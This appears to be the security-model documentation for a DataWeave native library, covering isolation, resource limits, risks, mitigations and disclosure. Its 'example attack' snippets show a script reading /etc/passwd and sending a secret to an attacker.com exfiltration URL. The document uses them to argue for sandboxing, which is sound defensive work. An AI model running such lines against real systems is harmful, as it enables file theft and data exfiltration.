# Security Model

This document describes the security characteristics, isolation guarantees, and limitations of the DataWeave native library.

## Architecture Overview

The DataWeave native library (`dwlib`) is built using **GraalVM Native Image** and exposes a C FFI for language bindings. Each execution runs in a **GraalVM isolate** with its own memory space.

```
┌─────────────────────────────────────────┐
│  Host Process (Python/Node/Go/Rust/C)  │
│                                         │
│  ┌───────────────────────────────────┐ │
│  │  Language Binding (FFI Layer)     │ │
│  └───────────────┬───────────────────┘ │
│                  │ C FFI                │
│  ┌───────────────▼───────────────────┐ │
│  │  dwlib (GraalVM Native Image)     │ │
│  │  ┌─────────────────────────────┐  │ │
│  │  │  GraalVM Isolate            │  │ │
│  │  │  (DataWeave Runtime)        │  │ │
│  │  └─────────────────────────────┘  │ │
│  └───────────────────────────────────┘ │
└─────────────────────────────────────────┘
```

## Security Properties

### ✅ Memory Isolation

- **GraalVM Isolate**: Each DataWeave execution runs in a separate GraalVM isolate with isolated heap
- **FFI Boundary**: Data crosses the FFI boundary only via explicit JSON serialization
- **No Shared State**: Multiple executions do not share memory (thread-safe by design)

### ✅ Thread Safety

- **Concurrent Execution**: Safe to run multiple scripts concurrently from different threads
- **Streaming Safety**: Streaming operations are thread-safe (one stream per execution context)
- **Language-Specific**: Each language binding documents its threading guarantees

### ⚠️ Resource Limits

**Configured by GraalVM Native Image build:**
- **Memory**: Limited by host process memory (no per-script limit enforced)
- **CPU**: No CPU time limits (long-running scripts can block indefinitely)
- **File Descriptors**: Uses host process limits (no isolation)

**Recommendation**: Run untrusted scripts in sandboxed containers (Docker, gVisor) with resource limits enforced at the OS level.

### ❌ Filesystem Access

**No isolation or access control:**
- DataWeave scripts can **read any file** the host process can access
- DataWeave scripts can **write any file** the host process can write
- No chroot, namespace, or filesystem virtualization

**Example attack:**
```dataweave
%dw 2.0
output application/json
---
readUrl("file:///etc/passwd")  // ⚠️ Can read arbitrary files
```

**Mitigation**: Run in a container or VM with restricted filesystem access.

### ❌ Network Access

**No isolation or firewall:**
- DataWeave scripts can make **HTTP/HTTPS requests** to any host
- DataWeave scripts can **connect to arbitrary TCP/UDP ports**
- No network namespace or egress filtering

**Example attack:**
```dataweave
%dw 2.0
output application/json
---
readUrl("https://attacker.com/exfiltrate?data=" ++ payload.secret)
```

**Mitigation**: Run in a network-restricted environment (network policies, firewall rules).

### ❌ Code Execution

**DataWeave is a transformation language, not a general-purpose scripting language:**
- No native function calls (no `system()`, `exec()`, etc.)
- No dynamic code loading (no `import()`, `require()` of arbitrary paths)
- **However**: Can invoke Java methods if enabled (not enabled by default in native image)

**Recommendation**: Treat DataWeave scripts as untrusted input. Do not execute scripts from untrusted sources without sandboxing.

## Known Vulnerabilities

### CVE-None-Yet

No CVEs have been assigned to the DataWeave native library as of this release.

### Potential Attack Vectors

1. **Denial of Service (DoS)**
   - **Infinite loops**: Script can loop indefinitely, blocking thread
   - **Memory exhaustion**: Large transformations can consume all available memory
   - **Regex DoS**: Complex regexes can cause catastrophic backtracking

2. **Information Disclosure**
   - **File read**: Scripts can read sensitive files (credentials, keys, etc.)
   - **Network exfiltration**: Scripts can send data to external hosts

3. **Resource Exhaustion**
   - **CPU**: Computationally expensive transformations can consume CPU
   - **Memory**: Large datasets can exhaust heap memory
   - **Disk**: Writing large files can fill disk

## Security Best Practices

### For Application Developers

1. **Validate Input Scripts**
   - Parse and validate DataWeave scripts before execution
   - Reject scripts with suspicious patterns (e.g., `readUrl`, `writeUrl`)
   - Consider a whitelist of allowed functions

2. **Run in Sandboxed Environments**
   ```bash
   # Docker with resource limits
   docker run --rm \
     --memory=512m \
     --cpus=1 \
     --network=none \
     --read-only \
     --tmpfs /tmp \
     my-app
   ```

3. **Set Timeouts**
   - Use language-specific timeout mechanisms (e.g., Python's `signal.alarm()`)
   - Kill hung processes after a reasonable timeout (e.g., 30 seconds)

4. **Restrict Filesystem Access**
   - Use read-only mounts for data directories
   - Use tmpfs for temporary writes
   - Avoid mounting sensitive directories (e.g., `/etc`, `/home`)

5. **Monitor Resource Usage**
   - Track CPU, memory, and network usage per execution
   - Alert on anomalies (high memory, long runtime, network activity)

### For Library Maintainers

1. **Update Dependencies**
   - Keep GraalVM Native Image up to date
   - Monitor security advisories for DataWeave runtime

2. **Security Audits**
   - Conduct regular security audits
   - Fuzz test with malformed inputs

3. **Vulnerability Disclosure**
   - Report security issues to security@salesforce.com
   - Follow responsible disclosure practices

## Reporting Security Issues

**Do not report security vulnerabilities via public GitHub issues.**

Instead, email security@salesforce.com with:
- **Summary**: Brief description of the vulnerability
- **Impact**: What an attacker can achieve
- **Reproduction**: Steps to reproduce the issue
- **Suggested Fix**: If you have one

We aim to respond within **48 hours** and provide a fix within **90 days**.

## Security Checklist for Production Use

- [ ] Run DataWeave scripts in isolated containers (Docker, gVisor, Firecracker)
- [ ] Set resource limits (memory, CPU, file descriptors)
- [ ] Restrict filesystem access (read-only mounts, no `/etc` or `/home`)
- [ ] Restrict network access (no egress, firewall rules)
- [ ] Set execution timeouts (30s max recommended)
- [ ] Validate DataWeave scripts before execution (parse, whitelist functions)
- [ ] Monitor resource usage (CPU, memory, network)
- [ ] Keep GraalVM and DataWeave runtime up to date
- [ ] Subscribe to security advisories (GitHub watch, mailing list)
- [ ] Test with untrusted inputs in a safe environment

## References

- [GraalVM Security Guide](https://www.graalvm.org/latest/security-guide/)
- [Salesforce Security Practices](https://trust.salesforce.com/en/security/)
- [OWASP Secure Coding Practices](https://owasp.org/www-project-secure-coding-practices-quick-reference-guide/)

---

**Last Updated**: 2026-06-30  
**Version**: 1.0.0
